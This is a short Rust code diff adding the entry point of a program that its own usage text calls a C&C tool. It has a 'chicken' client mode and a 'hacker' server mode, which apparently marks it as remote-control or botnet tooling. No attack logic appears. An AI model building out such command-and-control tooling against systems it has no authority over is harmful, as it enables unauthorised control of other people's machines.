@@ -1,3 +1,21 @@
-pub async fn run_application() {
+use std::env;
+use std::process::exit;
+use crate::{chicken, hacker, init};
+use crate::common::log::Log;
 
+const TIPS: &str = "\
+Usage: ./tester chicken ...args : Run C&C Client
+Usage: ./tester hacker ...args : Run C&C Server \
+";
+pub async fn run_application() {
+    init::__async__init__().await;
+    let side = match env::args().skip(1).next() {
+        None => Log::panic(TIPS),
+        Some(e) => e
+    };
+    match side.as_str() {
+        "chicken" => chicken::application::app().await,
+        "hacker" => hacker::application::app().await,
+        _ => Log::panic(TIPS),
+    };
 }
